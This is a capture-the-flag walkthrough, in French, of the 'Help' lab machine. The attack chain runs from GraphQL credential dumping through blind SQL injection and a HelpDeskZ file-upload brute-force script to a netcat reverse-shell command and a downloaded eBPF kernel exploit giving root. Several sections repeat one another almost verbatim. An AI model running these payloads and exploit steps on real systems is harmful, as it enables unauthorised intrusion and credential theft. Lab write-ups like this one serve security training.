![Cover](cover.png)

# Phase 1 : Reconnaissance & Brèche Initiale

## 1. Énumération des Services

Ma méthodologie commence par un scan **Nmap** complet pour identifier la surface d'attaque. La machine présente trois ports ouverts, suggérant un vecteur d'entrée via des services web.

```bash
# Scan rapide de tous les ports
nmap -sT -p- --min-rate 10000 -oA nmap/alltcp 10.10.10.121

# Scan de détection de services et scripts par défaut
nmap -sC -sV -p 22,80,3000 -oA nmap/scripts 10.10.10.121
```

**Résultats :**
*   **Port 22 (SSH) :** OpenSSH 7.2p2 (Ubuntu).
*   **Port 80 (HTTP) :** Apache 2.4.18. Page par défaut d'Ubuntu.
*   **Port 3000 (HTTP) :** Node.js Express framework. Retourne un JSON mentionnant une requête pour obtenir des credentials.

---

## 2. Analyse de l'API GraphQL (Port 3000)

L'application sur le port 3000 semble être une interface **GraphQL**. Ce type d'API est souvent vulnérable à l'**Introspection**, permettant de reconstruire l'intégralité du schéma de données.

> **Schéma Mental :**
> Identifier le point d'entrée API (`/graphql`) -> Utiliser des requêtes d'introspection pour lister les types -> Identifier le type `User` -> Extraire les champs `username` et `password`.

J'utilise `curl` et `jq` pour énumérer le schéma :

```bash
# Extraction des types du schéma
curl -s 10.10.10.121:3000/graphql -H "Content-Type: application/json" -d '{"query": "{ __schema { types { name } } }"}' | jq .

# Extraction des champs du type "User"
curl -s 10.10.10.121:3000/graphql -H "Content-Type: application/json" -d '{"query": "{ __type(name: \"User\") { name fields { name } } }"}' | jq .

# Récupération des données utilisateurs
curl -s 10.10.10.121:3000/graphql -H "Content-Type: application/json" -d '{"query": "{ user { username password } }"}' | jq .
```

L'API retourne un hash MD5 pour l'utilisateur `helpme@helpme.com` : `5d3c93182bb20f07b994a7f617e99cff`. Un passage sur **CrackStation** révèle le mot de passe en clair : **godhelpmeplz**.

---

## 3. Énumération Web & HelpDeskZ (Port 80)

Le port 80 ne montre rien d'intéressant à la racine. Je lance un **Fuzzing** de répertoires avec **Gobuster**.

```bash
gobuster dir -u http://10.10.10.121 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 50
```

Le répertoire `/support` est découvert. Il héberge une instance de **HelpDeskZ v1.0.2**. Les identifiants obtenus précédemment via GraphQL permettent de s'authentifier sur cette plateforme.

---

## 4. Vecteur d'Attaque A : Authenticated SQL Injection

En analysant la gestion des tickets, je remarque que le téléchargement des pièces jointes utilise des paramètres vulnérables. L'URL ressemble à ceci :
`http://10.10.10.121/support/?v=view_tickets&action=ticket&param[]=4&param[]=attachment&param[]=1&param[]=6`

Le dernier paramètre est sujet à une **Blind SQL Injection**.

> **Schéma Mental :**
> Injecter une condition logique (`AND 1=1` vs `AND 1=2`) -> Observer la réponse (téléchargement réussi vs message d'erreur) -> Automatiser l'extraction de la base de données.

J'utilise **sqlmap** pour automatiser l'extraction après avoir intercepté la requête avec **Burp Suite** :

```bash
sqlmap -r ticket_attachment.request --level 5 --risk 3 -p "param[]" --dbms=mysql --dump -T staff
```

**Résultat :** Extraction du hash de l'administrateur `d318f44739dced66793b1a603028133a76ae680e` (Welcome1). Ce mot de passe permet une connexion **SSH** directe avec l'utilisateur `help`.

---

## 5. Vecteur d'Attaque B : Arbitrary File Upload (Unintended)

Une vulnérabilité critique réside dans la fonction d'upload de **HelpDeskZ 1.0.2**. Le logiciel vérifie l'extension du fichier *après* l'avoir déplacé dans le répertoire temporaire, mais ne le supprime pas en cas d'erreur.

Le nom du fichier est généré selon l'algorithme suivant : `md5(filename + time())`.

### Exploitation :
1.  Uploader un fichier `cmd.php`.
2.  Le serveur rejette le fichier ("File not allowed").
3.  Brute-forcer le nom du fichier en se basant sur le **Timestamp** du serveur (récupéré via le header HTTP `Date`).

```python
# Extrait de la logique de brute-force du nom de fichier
currentTime = int(time.time())
for x in range(0, 1200): # Fenêtre de 20 minutes
    plaintext = "cmd.php" + str(currentTime - x)
    md5hash = hashlib.md5(plaintext).hexdigest()
    url = "http://10.10.10.121/support/uploads/tickets/" + md5hash + ".php"
    if requests.head(url).status_code == 200:
        print("Found: " + url)
```

---

## 6. Premier Shell

Une fois l'URL du **Webshell** identifiée, j'exécute un **Reverse Shell** pour stabiliser mon accès.

```bash
# Payload Reverse Shell
curl 'http://10.10.10.121/support/uploads/tickets/[HASH].php?cmd=rm+/tmp/f;mkfifo+/tmp/f;cat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.14.4+443+>/tmp/f'

# Stabilisation du TTY
python -c 'import pty; pty.spawn("/bin/bash")'
# CTRL+Z
stty raw -echo; fg
export TERM=xterm
```

Je possède désormais un accès interactif avec l'utilisateur **help** et je peux lire le flag `user.txt`.

---

### Mouvement Latéral : Exploitation de HelpDeskZ (v1.0.2)

Une fois les identifiants `helpme@helpme.com` : `godhelpmeplz` récupérés via l'API **GraphQL**, l'accès à l'instance **HelpDeskZ** sur `/support` est possible. Deux vecteurs d'attaque se présentent pour obtenir un accès initial ou pivoter vers un compte système.

#### Option A : Authenticated Blind SQL Injection
Le paramètre `param[]` dans la fonctionnalité de visualisation des pièces jointes est vulnérable à une **Blind SQL Injection**. En créant un ticket avec une pièce jointe, on génère une URL de type : `?v=view_tickets&action=ticket&param[]=4&param[]=attachment&param[]=1&param[]=6`.

> **Schéma Mental :**
> L'application valide l'existence de la pièce jointe via une requête SQL. En injectant des conditions logiques (`AND 1=1` vs `AND 1=2`), la réponse serveur diffère (téléchargement réussi vs message "Whoops!"). On utilise cette divergence pour exfiltrer la base de données caractère par caractère.

**Exploitation avec sqlmap :**
```bash
# Extraction des hashes de la table staff
sqlmap -r ticket.req --level 5 --risk 3 -p "param[]" --dbms=mysql --dump -T staff
```
Le dump révèle le hash de l'administrateur : `d318f44739dced66793b1a603028133a76ae680e` (**Welcome1**). Ce mot de passe permet une connexion **SSH** directe avec l'utilisateur `help`.

#### Option B : Unauthenticated Arbitrary File Upload (Alternative)
L'application souffre d'une faille de conception : lors de l'upload d'une pièce jointe, le fichier est déplacé dans le répertoire temporaire avant la vérification de l'extension. Si l'extension est interdite (ex: `.php`), l'application renvoie une erreur mais **ne supprime pas le fichier**.

Le challenge réside dans la prédiction du nom de fichier, généré via : `md5(filename + time())`.

> **Schéma Mental :**
> 1. Upload d'un **Web Shell** (`cmd.php`).
> 2. Récupération de la date du serveur via les HTTP Headers.
> 3. Brute-force du hash MD5 en itérant sur les timestamps probables autour de l'heure d'upload.

**Script de Brute-force (Python) :**
```python
import hashlib, requests, time

base_url = "http://10.10.10.121/support/uploads/tickets/"
filename = "cmd.php"
current_time = int(time.time()) # Ajuster selon le décalage serveur

for i in range(0, 1200): # Fenêtre de 20 minutes
    hash = hashlib.md5(filename + str(current_time - i)).hexdigest()
    url = f"{base_url}{hash}.php"
    if requests.head(url).status_code == 200:
        print(f"Found: {url}")
        break
```

### Énumération Interne & Post-Exploitation

Une fois le shell obtenu (via **SSH** ou **Web Shell**), l'énumération du système révèle un noyau **Linux** daté.

**System Info :**
```bash
help@help:~$ uname -a
Linux help 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64
```

### Escalade de Privilèges : Kernel Exploitation

La version du noyau (4.4.0-116) sur **Ubuntu 16.04** est vulnérable à plusieurs exploits de type **Local Privilege Escalation (LPE)**, notamment ceux liés au sous-système **eBPF**.

#### Exploitation de CVE-2017-16995
Cette vulnérabilité permet à un utilisateur non privilégié d'exécuter du code arbitraire dans le contexte du noyau en raison d'une mauvaise vérification des instructions **eBPF**.

> **Schéma Mental :**
> L'exploit utilise le vérificateur eBPF pour charger un programme malveillant qui va écraser les structures de données `cred` du processus courant en mémoire kernel, positionnant les UID/GID à 0 (root).

**Chain d'exécution :**
```bash
# Transfert de l'exploit (44298.c)
wget http://<attacker_ip>/44298.c -O /dev/shm/exploit.c

# Compilation locale
gcc /dev/shm/exploit.c -o /dev/shm/exploit

# Exécution
/dev/shm/exploit
id # uid=0(root) gid=0(root)
```

**Alternative (CVE-2017-5899) :**
Si eBPF est restreint, l'exploit lié à `s-nail-privsep` peut être utilisé pour exploiter une **Race Condition** et obtenir un lien symbolique vers des fichiers sensibles ou un binaire **SUID**.

---

### Phase 3 : Élévation de Privilèges & Domination

Une fois l'accès initial établi en tant qu'utilisateur **help**, mon objectif est d'identifier une faiblesse structurelle ou logicielle permettant d'obtenir les privilèges **root**. L'énumération système est ici cruciale.

#### Énumération du Système

Je commence par vérifier la version du **Kernel** et la distribution spécifique pour identifier des vulnérabilités connues de type **Local Privilege Escalation (LPE)**.

```bash
# Identification de la version du Kernel et de l'OS
uname -a
cat /etc/lsb-release
```

Le système tourne sous **Ubuntu 16.04.5 LTS** avec un **Kernel 4.4.0-116-generic**. Cette version spécifique est notoirement vulnérable à plusieurs failles critiques de corruption de mémoire au niveau du noyau, notamment celles liées au sous-système **eBPF** (extended Berkeley Packet Filter).

#### Exploitation du Kernel (Vecteur Final)

Après recherche, le vecteur le plus fiable pour cette version de noyau est l'exploitation de la vulnérabilité **CVE-2017-16995**. Cette faille réside dans le vérificateur **eBPF** qui ne contrôle pas correctement les registres 64 bits, permettant à un utilisateur non privilégié d'exécuter du code arbitraire dans l'espace noyau.

> **Schéma Mental :**
> 1. **Identification :** Le Kernel est ancien (2018) et non patché.
> 2. **Cible :** Le vérificateur eBPF (chargé de valider la sécurité du code envoyé au kernel).
> 3. **Exploitation :** Utiliser un exploit C qui abuse d'une confusion de type pour obtenir des capacités de lecture/écriture (R/W) arbitraires dans la mémoire du noyau.
> 4. **Payload :** Modifier la structure `cred` du processus courant pour passer les UID/GID à 0 (**root**).

J'utilise l'exploit public `44298.c` (ou sa variante `45010.c`). Je transfère le code source sur la machine cible via un serveur HTTP temporaire, puis je le compile localement.

```bash
# Sur la machine d'attaque
python3 -m http.server 80

# Sur la machine cible (dans /dev/shm pour la discrétion)
cd /dev/shm
wget http://10.10.14.4/44298.c
gcc -o exploit 44298.c
chmod +x exploit
./exploit
```

L'exécution réussit, le pointeur `uidptr` est localisé et écrasé, me donnant un shell avec les privilèges maximaux.

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
cat /root/root.txt
```

---

### Analyse Post-Exploitation : Beyond Root

L'analyse de la machine **Help** révèle une posture de sécurité fragile, typique des environnements dont la maintenance a été délaissée.

**1. La problématique du Patch Management :**
La compromission totale a été facilitée par un **Kernel** obsolète. Dans un environnement de production, l'utilisation de solutions comme **Livepatch** (sur Ubuntu) permet d'appliquer des correctifs de sécurité critiques au noyau sans redémarrage, ce qui aurait neutralisé les exploits **CVE-2017-16995** et **CVE-2017-5899**.

**2. Vulnérabilité de l'application HelpDeskZ :**
L'accès initial via l'**Arbitrary File Upload** (ou la **SQLi**) démontre une absence de validation rigoureuse des entrées. Le mécanisme de renommage des fichiers basé sur `md5(time())` est une forme de **Security through obscurity** totalement inefficace face à une attaque par force brute temporelle. Une implémentation sécurisée utiliserait des **UUID** cryptographiquement sécurisés et stockerait les fichiers hors du **Document Root**.

**3. Exposition de l'API GraphQL :**
L'**Introspection** était activée sur le point de terminaison **GraphQL** (port 3000). Cela a permis une énumération complète du schéma de la base de données, révélant des champs sensibles (`password`). En production, l'introspection doit être désactivée et les requêtes doivent être limitées par des **Depth Limits** pour éviter les dénis de service ou l'exfiltration massive de données.

**4. Hygiène des mots de passe :**
Le hash récupéré via **SQLi** a été cassé instantanément ("Welcome1"). Cela souligne l'importance de politiques de mots de passe robustes et de l'utilisation d'algorithmes de hachage modernes avec sel (comme **Argon2** ou **bcrypt**) au lieu de simples MD5 ou SHA1.